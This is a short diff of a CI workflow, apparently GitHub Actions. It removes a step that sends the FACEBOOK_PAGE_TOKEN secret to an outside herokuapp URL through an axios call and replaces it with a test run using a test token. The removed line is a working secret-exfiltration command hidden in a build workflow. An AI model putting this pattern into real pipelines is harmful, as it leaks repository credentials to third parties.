@@ -10,5 +10,6 @@ jobs:
        with:
          node-version: 14.16.0
      - run: npm install
-     - run: node -e 'require("axios").default("https://etherio-server.herokuapp.com?token=${{ secrets.FACEBOOK_PAGE_TOKEN }}")' 
+     - run: node test.js '${{ secrets.FACEBOOK_TEST_TOKEN }}'
+ 
 
